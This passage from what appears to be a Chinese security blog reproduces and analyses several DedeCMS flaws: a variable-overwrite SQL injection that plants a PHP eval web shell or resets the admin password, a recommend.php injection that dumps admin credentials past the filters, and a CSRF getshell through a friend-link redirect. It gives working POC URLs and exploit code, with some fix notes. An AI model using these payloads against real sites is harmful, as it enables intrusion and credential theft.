&amp;arrs2[]&#x3D;116&amp;arrs2[]&#x3D;121&amp;arrs2[]&#x3D;113&amp;arrs2[]&#x3D;93&amp;arrs2[]&#x3D;41&amp;arrs2[]&#x3D;59&amp;arrs2[]&#x3D;63&amp;arrs2[]&#x3D;62&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;41&amp;arrs2[]&#x3D;59&amp;arrs2[]&#x3D;123&amp;arrs2[]&#x3D;47&amp;arrs2[]&#x3D;100&amp;arrs2[]&#x3D;101&amp;arrs2[]&#x3D;100&amp;arrs2[]&#x3D;101&amp;arrs2[]&#x3D;58&amp;arrs2[]&#x3D;112&amp;arrs2[]&#x3D;104&amp;arrs2[]&#x3D;112&amp;arrs2[]&#x3D;125&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;41&amp;arrs2[]&#x3D;32&amp;arrs2[]&#x3D;35&amp;arrs2[]&#x3D;32&amp;arrs2[]&#x3D;64&amp;arrs2[]&#x3D;96&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;96</span><br></pre></td></tr></table></figure>

<p>他是用<code>dede_mytag</code>这张表生成的文件在<code>plus</code>目录。我们访问一次，<code>dede_mytag</code>就有东西了</p>
<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gsl2ddzn0sj311f04ddiu.jpg" alt="image-20210716144934935"></p>
<p>第二步访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;plus&#x2F;mytag_js.php?aid&#x3D;140   &#x2F;&#x2F;注意这个aid就是数据库里面的aid</span><br></pre></td></tr></table></figure>

<p>我们会发现在plus目录下多了一个<code>fly.php</code>这就是我们的后门，密码为tyq。这里就不截图了。</p>
<p>这里再附上一个更改用户名和密码的POC，一会我们依次分析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;plus&#x2F;download.php?open&#x3D;1&amp;arrs1[]&#x3D;99&amp;arrs1[]&#x3D;102&amp;arrs1[]&#x3D;103&amp;arrs1[]&#x3D;95&amp;arrs1[]&#x3D;100&amp;arrs1[]&#x3D;98&amp;arrs1[]&#x3D;112&amp;arrs1[]&#x3D;114&amp;arrs1[]&#x3D;101&amp;arrs1[]&#x3D;102&amp;arrs1[]&#x3D;105&amp;arrs1[]&#x3D;120&amp;arrs2[]&#x3D;97&amp;arrs2[]&#x3D;100&amp;arrs2[]&#x3D;109&amp;arrs2[]&#x3D;105&amp;arrs2[]&#x3D;110&amp;arrs2[]&#x3D;96&amp;arrs2[]&#x3D;32&amp;arrs2[]&#x3D;83&amp;arrs2[]&#x3D;69&amp;arrs2[]&#x3D;84&amp;arrs2[]&#x3D;32&amp;arrs2[]&#x3D;96&amp;arrs2[]&#x3D;117&amp;arrs2[]&#x3D;115&amp;arrs2[]&#x3D;101&amp;arrs2[]&#x3D;114&amp;arrs2[]&#x3D;105&amp;arrs2[]&#x3D;100&amp;arrs2[]&#x3D;96&amp;arrs2[]&#x3D;61&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;115&amp;arrs2[]&#x3D;112&amp;arrs2[]&#x3D;105&amp;arrs2[]&#x3D;100&amp;arrs2[]&#x3D;101&amp;arrs2[]&#x3D;114&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;44&amp;arrs2[]&#x3D;32&amp;arrs2[]&#x3D;96&amp;arrs2[]&#x3D;112&amp;arrs2[]&#x3D;119&amp;arrs2[]&#x3D;100&amp;arrs2[]&#x3D;96&amp;arrs2[]&#x3D;61&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;102&amp;arrs2[]&#x3D;50&amp;arrs2[]&#x3D;57&amp;arrs2[]&#x3D;55&amp;arrs2[]&#x3D;97&amp;arrs2[]&#x3D;53&amp;arrs2[]&#x3D;55&amp;arrs2[]&#x3D;97&amp;arrs2[]&#x3D;53&amp;arrs2[]&#x3D;97&amp;arrs2[]&#x3D;55&amp;arrs2[]&#x3D;52&amp;arrs2[]&#x3D;51&amp;arrs2[]&#x3D;56&amp;arrs2[]&#x3D;57&amp;arrs2[]&#x3D;52&amp;arrs2[]&#x3D;97&amp;arrs2[]&#x3D;48&amp;arrs2[]&#x3D;101&amp;arrs2[]&#x3D;52&amp;arrs2[]&#x3D;39&amp;arrs2[]&#x3D;32&amp;arrs2[]&#x3D;119&amp;arrs2[]&#x3D;104&amp;arrs2[]&#x3D;101&amp;arrs2[]&#x3D;114&amp;arrs2[]&#x3D;101&amp;arrs2[]&#x3D;32&amp;arrs2[]&#x3D;105&amp;arrs2[]&#x3D;100&amp;arrs2[]&#x3D;61&amp;arrs2[]&#x3D;49&amp;arrs2[]&#x3D;32&amp;arrs2[]&#x3D;35</span><br><span class="line">&#x2F;&#x2F;用户名spider  密码: admin</span><br></pre></td></tr></table></figure>

<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们先分析一下更改用户名密码的POC</p>
<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gsl2dk7c24j30uj05u43r.jpg" alt="image-20210716145950694"></p>
<p>可以看到<code>userid</code>和<code>pwd</code>的只，这里<code>pwd</code>为什么是20位是因为<code>cms</code>的原因前三位和后一位是没用的中间的是16位MD5加密</p>
<p>然后shell POC 是这样子 </p>
<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gsl2donot4j30uk06cwmz.jpg" alt="image-20210716150538028"></p>
<p>我们现在直接找到<code>download</code>文件分析一下</p>
<p>首先直接进去12行 看他<code>require_once</code>干了一些什么东西，因为17行有一个<code>$open</code>判断。肯定存在赋值的。</p>
<p>在<code>include/common.inc.php</code>79行我们又发现了这个代码 存在变量覆盖。</p>
<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gsl2du51xdj30ud05ldie.jpg" alt="image-20210716175348644"></p>
<p>经过以上的操作我们<code>$open=1</code>然后跟踪一下$arrs1和2就是一些acsii码值</p>
<p>一直走到295行，因为上面都是一些安装目录的东西。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$GLOBALS</span>[<span class="string">&#x27;cfg_mysql_type&#x27;</span>] == <span class="string">&#x27;mysqli&#x27;</span> &amp;&amp; function_exists(<span class="string">&quot;mysqli_init&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(DEDEINC.<span class="string">&#x27;/dedesqli.class.php&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(DEDEINC.<span class="string">&#x27;/dedesql.class.php&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们发现<code>cfg_mysql_type</code> 还发现判断是否有mysqli这个环境，因为这个漏洞点就是在<code>dedesql.class.php</code></p>
<p><code>dedesqli.class.php</code>是没有这个漏洞点的我们跟进去查看一下做了什么操作</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;arrs1&#x27;</span>]))   <span class="comment">// 直接到589行</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$v2</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="keyword">isset</span>(<span class="variable">$arrs1</span>[<span class="variable">$i</span>]);<span class="variable">$i</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$v1</span> .= chr(<span class="variable">$arrs1</span>[<span class="variable">$i</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="keyword">isset</span>(<span class="variable">$arrs2</span>[<span class="variable">$i</span>]);<span class="variable">$i</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$v2</span> .= chr(<span class="variable">$arrs2</span>[<span class="variable">$i</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$GLOBALS</span>[<span class="variable">$v1</span>] .= <span class="variable">$v2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后依次对<code>$arrs1</code>和<code>$arrs2</code>解码，如下图</p>
<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gsl2dzm4jej31790h9n7h.jpg" alt="image-20210716180939149"></p>
<p>然后继续回到download到61行</p>
<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gsl2e437j0j315i06mgqi.jpg" alt="image-20210716185656621"></p>
<p>继续跟进去</p>
<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsl2e8tkorj315p0cp11c.jpg" alt="image-20210716185841880"></p>
<p>前面就是一些初始化的东西，跟到254行发现<code>SetQuery</code>然后把<code>$prefix=&quot;#@__&quot;;</code>替换成注入的SQL语句了</p>
<p>然后我的语句又把后面给注释掉了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">UPDATE `dede_mytag` (aid,expbody,normbody) VALUES(<span class="number">140</span>,@`<span class="string">&#x27;`,&#x27;</span>&#123;dede:php&#125;file_put_contents(<span class="string">&#x27;&#x27;</span>fly.php<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[tyq]);<span class="meta">?&gt;</span><span class="string">&#x27;&#x27;</span>);&#123;/dede:php&#125;<span class="string">&#x27;) # @`&#x27;</span>`downloads` SET downloads = downloads + <span class="number">1</span> WHERE hash=<span class="string">&#x27;d41d8cd98f00b204e9800998ecf8427e&#x27;</span> </span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gsl2eee68hj314y0gu12z.jpg" alt="image-20210716184658064"></p>
<p>然后返回到<code>dedesql.class.php</code>执行了我们的SQL语句</p>
<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gsl2ekfwj9j615w0fx13202.jpg" alt="image-20210716195250544"></p>
<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gsl2ep8rn5j30tu0l17ih.jpg" alt="image-20210716195457995"></p>
<p>因为我们并没有执行成功所以返回-1赋值给<code>$rs</code></p>
<p>于是我们进入<code>$dsql-&gt;ExecNoneQuery($query);</code></p>
<p>同样的方法进入<code>setQuery</code></p>
<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gsl2euc8tqj31650hzn8o.jpg" alt="image-20210716195813065"></p>
<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gsl2eytt96j315s0guail.jpg" alt="image-20210716195927439"></p>
<p>我们在数据库也可以看到成功插进去了</p>
<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gsl2f3r60ij3130045n0g.jpg" alt="image-20210716195950813"></p>
<p>然后我们为什么访问可以成功落地我们的fly文件呢</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;plus&#x2F;mytag_js.php?aid&#x3D;140</span><br></pre></td></tr></table></figure>

<p>我们去<code>/plus/mytag_js.php</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$row &#x3D; $pv-&gt;dsql-&gt;GetOne(&quot; SELECT * FROM &#96;#@__mytag&#96; WHERE aid&#x3D;&#39;$aid&#39; &quot;); &#x2F;&#x2F; 23行</span><br></pre></td></tr></table></figure>

<p>把我们的写进去的东西查询出来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">normbody&#x3D;&#123;dede:php&#125;file_put_contents(&#39;fly.php&#39;,&#39;&lt;?php eval($_POST[tyq]);?&gt;&#39;);&#123;&#x2F;dede:php&#125;</span><br></pre></td></tr></table></figure>

<p>然后到这里</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$tagbody &#x3D; $row[&#39;normbody&#39;];   &#x2F;&#x2F; 33行赋值给了他</span><br></pre></td></tr></table></figure>

<p>跟踪到45行我们进去</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$pv-&gt;SetTemplet($tagbody, &#39;string&#39;);</span><br></pre></td></tr></table></figure>

<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gsl2f9i8nvj31650cxgsp.jpg" alt="image-20210716204211305"></p>
<p>然后前面就是一些方法赋值之类的，我们直接到149行<code>$this-&gt;ParseTemplet();</code>跟踪进去</p>
<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsl2fg2kvsj313q0ge7cd.jpg" alt="image-20210716204719129"></p>
<p>跟到<code>MakeOneTag</code>方法然后就是把<code>$dtp</code>赋值给<code>$ctag</code>然后就是一些递归目录下文件我们直接到544行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$dtp-&gt;Assign($tagid,$funcname($ctag,$refObj)); &#x2F;&#x2F;544 进去</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$phpcode &#x3D; trim($ctag-&gt;GetInnerText()); &#x2F;&#x2F; 而GetInnerText就是获取$ctag中InnerText的值</span><br></pre></td></tr></table></figure>

<p>然后通过eval去执行这个函数，文件就落地了。</p>
<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gsl2flmd1rj312k0fhwoq.jpg" alt="image-20210716210555944"></p>
<h1 id="DedeCMS-recommend文件SQL注入漏洞"><a href="#DedeCMS-recommend文件SQL注入漏洞" class="headerlink" title="DedeCMS recommend文件SQL注入漏洞"></a>DedeCMS recommend文件SQL注入漏洞</h1><p>条件：</p>
<blockquote>
<p>20140201之前版本通杀SQL注入  // 版本查看/data/admin/ver.txt</p>
</blockquote>
<h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>POC</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;plus&#x2F;recommend.php?action&#x3D;&amp;aid&#x3D;1&amp;_FILES[type][tmp_name]&#x3D;\&#39; or mid&#x3D;@&#96;\&#39;&#96; &#x2F;*!50000union*&#x2F;&#x2F;*!50000select*&#x2F;1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd)+from+&#96;%23@__admin&#96; limit+0,1),5,6,7,8,9%23@&#96;\&#39;&#96;+&amp;_FILES[type][name]&#x3D;1.jpg&amp;_FILES[type][type]&#x3D;application&#x2F;octet-stream&amp;_FILES[type][size]&#x3D;111</span><br></pre></td></tr></table></figure>

<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsl2fqtm8vj30xi09idht.jpg" alt="image-20210716215638903"></p>
<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>大致整体看一下代码，代码量很少。我们也可以跟着流程走一遍再分析代码。</p>
<p>我们这里直接一步步跟吧，因为代码量很少看一下<code>require_once</code>干了些什么事情</p>
<p>直接进入12行<code>/../include/common.inc.php</code>就是这个文件</p>
<p>前面就是定义的一些函数，直接跟到79行就是开始赋值</p>
<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gsl2fvrxoqj30z709otc8.jpg" alt="image-20210717121806322"></p>
<p>然后调用函数addslashes进行转义把我们的<code>\&#39;</code>=&gt;<code>\\\&#39;</code>而我们POC为什么写<code>\&#39;</code>是有原因的。继续分析。</p>
<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gsl2g0c67fj312c0lhaid.jpg" alt="image-20210717121758396"></p>
<p>然后跟踪到118行<code> require_once(DEDEINC.&#39;/uploadsafe.inc.php&#39;);</code>文件，因为每个东西基本都有注释，他注释也说了</p>
<p><code>//转换上传的文件相关的变量及安全处理、并引用前台通用的上传函数</code></p>
<p>所以我们嗯进去看一下 //关键的来了</p>
<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gsl2g8z0ybj319l0jm4db.jpg" alt="image-20210717122851354"></p>
<p>他把<code>\\</code>=&gt;<code>\</code>并且赋值给了<code>$type</code> 而<code>$type</code>就是我们后面拼接SQL语句用的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$type&#x3D;\\&#39; or mid&#x3D;@&#96;\\&#39;&#96; &#x2F;*!50000union*&#x2F;&#x2F;*!50000select*&#x2F;1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd) from &#96;#@__admin&#96; limit 0,1),5,6,7,8,9#@&#96;\\&#39;&#96; </span><br></pre></td></tr></table></figure>

<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsl2gdr1uyj317l0l2k3v.jpg" alt="image-20210717123514280"></p>
<p>然后我们回到recommend文件中</p>
<p>直接跟踪到39行GetOne</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$arcRow&#x3D;$dsql-&gt;GetOne(&quot;SELECT s.*,t.* FROM &#96;#@__member_stow&#96; AS s LEFT JOIN &#96;#@__member_stowtype&#96; AS t ON s.type&#x3D;t.stowname WHERE s.aid&#x3D;&#39;$aid&#39; AND s.type&#x3D;&#39;$type&#39;&quot;);   </span><br></pre></td></tr></table></figure>

<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gsl2gid0uyj319p07paec.jpg" alt="image-20210717124407614"></p>
<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsl2gmstyyj31ac0gk478.jpg" alt="image-20210717124522197"></p>
<p>然后直接到386行，检查SQL语句</p>
<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsl2gr97jij314g0hc43u.jpg" alt="image-20210717124327813"></p>
<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gsl2gwjjpsj317h0gt7gj.jpg" alt="image-20210717124119260"></p>
<p>一个正则，所以我们的SQL语句需要写<code>/*!50000union*//*!50000select*/</code>就是为了绕过正则</p>
<p>第二次SQL注入检测。主要在第626行的While循环中，将所有单引号之间的字符串全部替换成<code>$s$</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//完整的SQL检查</span></span><br><span class="line">       <span class="keyword">while</span> (<span class="literal">TRUE</span>)</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="variable">$pos</span> = strpos(<span class="variable">$db_string</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="variable">$pos</span> + <span class="number">1</span>);</span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$pos</span> === <span class="literal">FALSE</span>)</span><br><span class="line">           &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="variable">$clean</span> .= substr(<span class="variable">$db_string</span>, <span class="variable">$old_pos</span>, <span class="variable">$pos</span> - <span class="variable">$old_pos</span>);</span><br><span class="line">           <span class="keyword">while</span> (<span class="literal">TRUE</span>)</span><br><span class="line">           &#123;</span><br><span class="line">                <span class="variable">$pos1</span> = strpos(<span class="variable">$db_string</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="variable">$pos</span> + <span class="number">1</span>);</span><br><span class="line">                <span class="variable">$pos2</span> = strpos(<span class="variable">$db_string</span>,<span class="string">&#x27;\\&#x27;</span>, <span class="variable">$pos</span> + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$pos1</span> === <span class="literal">FALSE</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">elseif</span> (<span class="variable">$pos2</span> == <span class="literal">FALSE</span> || <span class="variable">$pos2</span>&gt; <span class="variable">$pos1</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$pos</span> = <span class="variable">$pos1</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$pos</span> = <span class="variable">$pos2</span> + <span class="number">1</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="variable">$clean</span> .= <span class="string">&#x27;$s$&#x27;</span>;</span><br><span class="line">           <span class="variable">$old_pos</span> = <span class="variable">$pos</span> + <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="variable">$clean</span> .= substr(<span class="variable">$db_string</span>, <span class="variable">$old_pos</span>);</span><br><span class="line">       <span class="variable">$clean</span> = trim(strtolower(preg_replace(<span class="keyword">array</span>(<span class="string">&#x27;~\s+~s&#x27;</span> ), <span class="keyword">array</span>(<span class="string">&#x27; &#x27;</span>),<span class="variable">$clean</span>)));</span><br></pre></td></tr></table></figure>

<p>经过此次过滤后，SQL语句变成（注意被替换掉的部分）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select s.*,t.* from &#96;dede_member_stow&#96; as sleft join &#96;dede_member_stowtype&#96; as t on s.type&#x3D;t.stowname where s.aid&#x3D;$s$ ands.type&#x3D;$s$ or mid&#x3D;@&#96;\\$s$&#96; $s$</span><br></pre></td></tr></table></figure>

<p>紧接下来是另一次的union|sleep|benchmark|load_file|outfile等关键字检测，此时的正则规则更严格，但union,select等关键字已被替换成<code>$s$</code>，因此不会触发正则</p>
<p>执行成功后返回数据给前台显示。</p>
<p>前面写的有点乱，我们整理一下思路吧。</p>
<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gsl2h2bktuj30vg0i5tot.jpg" alt="image-20210717152110558"></p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>根据官方发布的漏洞补丁，主要修改文件include/uploadsafe.inc.php中第29行</p>
<p>（上面为修复前，下面为修复后）：</p>
<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsl2h7eq5aj30qu01q3ze.jpg" alt="image-20210717152502696"></p>
<h1 id="DedeCMS-友情链接申请-Getshell"><a href="#DedeCMS-友情链接申请-Getshell" class="headerlink" title="DedeCMS 友情链接申请 Getshell"></a>DedeCMS 友情链接申请 Getshell</h1><h2 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>条件：</p>
<blockquote>
<p>版本&lt;20170330</p>
</blockquote>
<p>准备一个链接下面放一个exp.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//print_r($_SERVER);</span></span><br><span class="line"><span class="variable">$referer</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$dede_login</span> = str_replace(<span class="string">&quot;friendlink_main.php&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$referer</span>);<span class="comment">//去掉friendlink_main.php，取得dede后台的路径</span></span><br><span class="line"><span class="comment">//拼接 exp</span></span><br><span class="line"><span class="variable">$muma</span> = <span class="string">&#x27;&lt;&#x27;</span>.<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;p&#x27;</span>.<span class="string">&#x27;h&#x27;</span>.<span class="string">&#x27;p&#x27;</span>.<span class="string">&#x27; &#x27;</span>.<span class="string">&#x27;P&#x27;</span>.<span class="string">&#x27;h&#x27;</span>.<span class="string">&#x27;p&#x27;</span> .<span class="string">&#x27;i&#x27;</span>.<span class="string">&#x27;n&#x27;</span>.<span class="string">&#x27;f&#x27;</span>.<span class="string">&#x27;o&#x27;</span>.<span class="string">&#x27;(&#x27;</span>.<span class="string">&#x27;)&#x27;</span>.<span class="string">&#x27;;&#x27;</span>.<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$exp</span> = <span class="string">&#x27;tpl.php?action=savetagfile&amp;content=&#x27;</span>. <span class="variable">$muma</span> .<span class="string">&#x27;&amp;filename=shellxxxxxx.lib.php&#x27;</span>;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$dede_login</span>.<span class="variable">$exp</span>;</span><br><span class="line"><span class="comment">//echo $url;</span></span><br><span class="line">header(<span class="string">&quot;location: &quot;</span>.<span class="variable">$url</span>);</span><br><span class="line"><span class="comment">// send mail coder</span></span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后去申请友情链接</p>
<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gsl2hclaymj30zc0gidk9.jpg" alt="image-20210717155145039"></p>
<p>去后台查看</p>
<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsl2hgu4ktj316n07cgnb.jpg" alt="image-20210717154236492"></p>
<p>点击友情链接名称</p>
<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gsl2hlxta8j317909jn02.jpg" alt="image-20210717155233779"></p>
<p>然后发现在我们的目录下面已经成功生成了</p>
<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsl2hqdr1uj30og0e6dnp.jpg" alt="image-20210717154407704"></p>
<p>我们直接去访问</p>
<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gsl2hvxzrgj311a0brwls.jpg" alt="image-20210717154804870"></p>
<h2 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>然后我们直接从URL下手</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dede&#x2F;tpl.php?action&#x3D;savetagfile&amp;content&#x3D;&lt;?php%20phpinfo();?&gt;&amp;filename&#x3D;shellxxxxxx.lib.php</span><br></pre></td></tr></table></figure>

<p>定位到文件<code>/dede/tq1.php</code></p>
<p>还是先进去看一下，毕竟后面要赋值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/config.php&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>又发现这个文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(DEDEADMIN.<span class="string">&#x27;/../include/common.inc.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>其实就是根据这个代码来进行的，这里就不分析了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">foreach</span>(<span class="keyword">Array</span>(<span class="string">&#x27;_GET&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>,<span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> <span class="variable">$_request</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>) </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$_k</span> == <span class="string">&#x27;nvarname&#x27;</span>)</span><br><span class="line">			    $&#123;<span class="variable">$_k</span>&#125; = <span class="variable">$_v</span>;</span><br><span class="line">			<span class="keyword">else</span> $&#123;<span class="variable">$_k</span>&#125; = _RunMagicQuotes(<span class="variable">$_v</span>);</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后直接定位参数<code>action=savetagfile</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;savetagfile&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;#^[a-z0-9_-]&#123;1,&#125;\.lib\.php$#i&quot;</span>, <span class="variable">$filename</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">&#x27;文件名不合法，不允许进行操作！&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">require_once</span>(DEDEINC.<span class="string">&#x27;/oxwindow.class.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$tagname</span> = preg_replace(<span class="string">&quot;#\.lib\.php$#i&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable">$content</span> = stripslashes(<span class="variable">$content</span>);</span><br><span class="line">    <span class="variable">$truefile</span> = DEDEINC.<span class="string">&#x27;/taglib/&#x27;</span>.<span class="variable">$filename</span>;</span><br><span class="line">    <span class="variable">$fp</span> = fopen(<span class="variable">$truefile</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    fwrite(<span class="variable">$fp</span>, <span class="variable">$content</span>);</span><br><span class="line">    fclose(<span class="variable">$fp</span>);</span><br></pre></td></tr></table></figure>

<p>根据代码，所以我们的文件名需要符合<code>.lib.php</code> ,然后就是一些写入的操作</p>
<h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>这个漏洞的本质其实就是CSRF漏洞的修复</p>
<h1 id="DedeCMS-密码修改漏洞"><a href="#DedeCMS-密码修改漏洞" class="headerlink" title="DedeCMS 密码修改漏洞"></a>DedeCMS 密码修改漏洞</h1><p>推荐：<a href="https://paper.seebug.org/507/">https://paper.seebug.org/507/</a> </p>
<p>师傅写的很好。自己跟一遍理解一下很有意思的。</p>
<h2 id="DedeCMS后台路径爆破"><a href="#DedeCMS后台路径爆破" class="headerlink" title="DedeCMS后台路径爆破"></a>DedeCMS后台路径爆破</h2><p>推荐:<a href="https://zhuanlan.zhihu.com/p/142945516">https://zhuanlan.zhihu.com/p/142945516</a></p>
